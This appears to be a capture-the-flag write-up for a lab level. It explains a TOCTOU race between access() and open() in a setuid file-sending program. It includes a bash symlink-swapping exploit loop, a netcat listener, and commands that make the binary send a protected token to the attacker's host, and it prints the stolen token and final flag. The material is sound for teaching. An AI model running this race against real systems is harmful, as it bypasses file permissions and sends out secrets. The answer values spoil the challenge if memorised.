

```
The program sends a file given as argv[1] to an host specified as argv[2] at port 6969.

It check's for the permission with access() and then it opens the file if the permission check is ok.

We encounter a race condition here (TOCTOU).

If we create a file that is a symlink of the targeted file and we create a program that switch it's linked file really fast. We can pretend to point to a authorized file for the access() check but rapidly change the link to the targeted file for the open syscall and we have bypassed the check.
```

\- Let's make a script in bash:
```bash
#!/bin/bash

while true
do
	rm -rf /tmp/link
	ln -sf /tmp/test /tmp/link # symlink /tmp/link -> /tmp/test
	rm -rf /tmp/link
	ln -sf token /tmp/link # symlink /tmp/link -> token
done
```


\- Let's try to transfer the exploit file to the targeted host, set up the context for the exploit and finally exploit :
```bash
[Local]:
> scp -P 4242 exploit.sh level10@192.168.56.101:/tmp
> nc -lnvp 6969	

[VM]:
> cd /tmp
> touch /tmp/test
> ./exploit.sh 
> while true ; do (./level10 /tmp/link 192.168.56.1); done

[Local]:                              
Listening on 0.0.0.0 6969
Connection received on 192.168.56.101 33282
.*( )*.
woupa2yuojeeaaed06riuj63c

> su flag10
> getflag
feulo4b72j7edeahuete3no7c
```

*feulo4b72j7edeahuete3no7c*